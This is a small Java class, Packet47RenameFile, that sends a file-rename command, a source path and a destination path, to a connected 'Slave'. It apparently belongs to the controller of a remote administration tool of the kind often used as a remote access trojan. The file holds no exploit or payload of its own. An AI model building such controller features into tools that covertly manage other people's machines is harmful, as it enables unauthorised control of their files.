package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet47RenameFile extends AbstractOutgoingPacket {

	private String file;
	private String dest;
	
	public Packet47RenameFile(String file, String dest) {
		this.file = file;
		this.dest = dest;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
		slave.writeLine(dest);
	}

	@Override
	public byte getPacketId() {
		return 47;
	}

}
